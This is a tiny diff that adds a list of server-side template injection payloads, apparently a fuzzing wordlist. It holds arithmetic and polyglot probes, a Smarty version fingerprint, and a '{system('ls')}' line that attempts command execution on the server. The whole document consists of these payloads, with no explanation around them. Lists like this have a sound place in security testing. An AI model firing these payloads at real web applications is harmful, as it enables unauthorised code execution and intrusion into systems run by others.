@@ -1,0 +1,4 @@
+{7*7}
+<%'${{/#{@}}%>{{
+{$smarty.version}
+{system('ls')}
